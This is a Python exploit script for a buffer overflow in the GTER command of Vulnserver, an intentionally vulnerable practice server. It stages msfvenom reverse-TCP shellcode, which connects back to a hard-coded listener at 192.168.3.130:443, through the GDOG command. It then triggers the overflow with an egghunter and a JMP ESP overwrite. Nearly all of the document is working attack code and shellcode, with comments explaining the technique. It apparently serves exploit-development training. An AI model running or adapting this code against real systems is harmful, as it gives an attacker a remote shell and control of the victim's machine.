# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Desc.		: Steve Bradshaw's Vulnserver Buffer Overflow [GTER Command]
# OS		: Windows Vista ULTIMATE x86 SP2
# Date		: 12/03/2018

import sys
import struct
import time
from socket import create_connection as cc

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print 'Usage : {} TARGET_IP'.format(sys.argv[0])
	sys.exit()

host = str(sys.argv[1])
port = 9999

try:
	sock = cc((host, port))
except:
	print "Connection Error\n"
	sys.exit()

# Grab the banner
banner = sock.recv(1024)
print "Connected to ", host
print banner


# 32 byte egghunt shellcode (egg=0x57303054)
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7";


nop = "\x90"
payload = "GTER /.:/"

#EIP Offset 147
# JMP ESP 625011C7
EIP = p(0x625011C7)
JMP_EAX = "\x04\x05\x04\x04\xff\xe0"
payload += nop * 16 + egghunter + "A"*(147-32-16) + EIP + nop * 7 + JMP_EAX + nop *7

# WE DO NOT HAVE ENOUGH SPACE FOR ACCOMODATING OUR BIND/REVERSE SHELLCODE. EGGHUNTER MUST BE USED.
# USING THE GTER ALONE WE CANNOT INTRODUCE SHELLCODE INTO MEMORY. FOR THIS ANOTHER COMMAND MUST BE USED.
# USING THE GDOG COMMAND, SHELLCODE CAN BE SAFELY INTRODUCED TO MEMORY.

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.130 LPORT=443 -f c -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
shellcode =  "T00WT00W" + ("\xbe\xd0\xfe\x0e\xa1\xda\xd4\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x73\x0e\x03\xa3\xf0\xec\x54\xbf\xe5\x73"
"\x96\x3f\xf6\x13\x1e\xda\xc7\x13\x44\xaf\x78\xa4\x0e\xfd\x74"
"\x4f\x42\x15\x0e\x3d\x4b\x1a\xa7\x88\xad\x15\x38\xa0\x8e\x34"
"\xba\xbb\xc2\x96\x83\x73\x17\xd7\xc4\x6e\xda\x85\x9d\xe5\x49"
"\x39\xa9\xb0\x51\xb2\xe1\x55\xd2\x27\xb1\x54\xf3\xf6\xc9\x0e"
"\xd3\xf9\x1e\x3b\x5a\xe1\x43\x06\x14\x9a\xb0\xfc\xa7\x4a\x89"
"\xfd\x04\xb3\x25\x0c\x54\xf4\x82\xef\x23\x0c\xf1\x92\x33\xcb"
"\x8b\x48\xb1\xcf\x2c\x1a\x61\x2b\xcc\xcf\xf4\xb8\xc2\xa4\x73"
"\xe6\xc6\x3b\x57\x9d\xf3\xb0\x56\x71\x72\x82\x7c\x55\xde\x50"
"\x1c\xcc\xba\x37\x21\x0e\x65\xe7\x87\x45\x88\xfc\xb5\x04\xc5"
"\x31\xf4\xb6\x15\x5e\x8f\xc5\x27\xc1\x3b\x41\x04\x8a\xe5\x96"
"\x6b\xa1\x52\x08\x92\x4a\xa3\x01\x51\x1e\xf3\x39\x70\x1f\x98"
"\xb9\x7d\xca\x0f\xe9\xd1\xa5\xef\x59\x92\x15\x98\xb3\x1d\x49"
"\xb8\xbc\xf7\xe2\x53\x47\x90\xcc\x0c\x44\xe2\xa5\x4e\x4a\xe3"
"\x8e\xc6\xac\x89\xe0\x8e\x67\x26\x98\x8a\xf3\xd7\x65\x01\x7e"
"\xd7\xee\xa6\x7f\x96\x06\xc2\x93\x4f\xe7\x99\xc9\xc6\xf8\x37"
"\x65\x84\x6b\xdc\x75\xc3\x97\x4b\x22\x84\x66\x82\xa6\x38\xd0"
"\x3c\xd4\xc0\x84\x07\x5c\x1f\x75\x89\x5d\xd2\xc1\xad\x4d\x2a"
"\xc9\xe9\x39\xe2\x9c\xa7\x97\x44\x77\x06\x41\x1f\x24\xc0\x05"
"\xe6\x06\xd3\x53\xe7\x42\xa5\xbb\x56\x3b\xf0\xc4\x57\xab\xf4"
"\xbd\x85\x4b\xfa\x14\x0e\x7b\xb1\x34\x27\x14\x1c\xad\x75\x79"
"\x9f\x18\xb9\x84\x1c\xa8\x42\x73\x3c\xd9\x47\x3f\xfa\x32\x3a"
"\x50\x6f\x34\xe9\x51\xba")

shellcode_dropper = "GDOG " + shellcode

print "[*] Sending payload to drop Shellcode in memory"
sock.send(shellcode_dropper)

# SENDING THE SHELLCODE DROPPER PAYLOAD AND THE ACTUAL CRASH PAYLOAD BACK TO BACK THROUGH THE SAME SOCKET CONNECTION
# RESULTED IN THE REVERSE/BIND SHELLCODE PAYLOAD BEING OVERWRITTEN IN MEMORY AND THERE BY RESULTING IN SITUATION WHERE
# EGGHUNTER SEARCHES THROUGH THE ENTIRE MEMORY FOR 'T00WT00W + SHELLCODE' WHILE IT IS CLEARY NOT PRESENT / MANGLED / LOST.

# TO AVOID THIS SCENARIO, CLOSE THE SOCKET ONCE SHELLCODE DROPPER PAYLOAD IS SENT AND CREATE A NEW SOCKET CONNECTION AND SEND
# ACTUAL CRASH PAYLOAD WITH THE NEWLY CREATED SOCKET CONNECTION.

print "[*] Closing old socket"
sock.close()

print "[*] Creating new socket"
sock = cc((host, port))
print "[+] Sending UB3R Payl0ad via the new socket:D"
sock.send(payload)
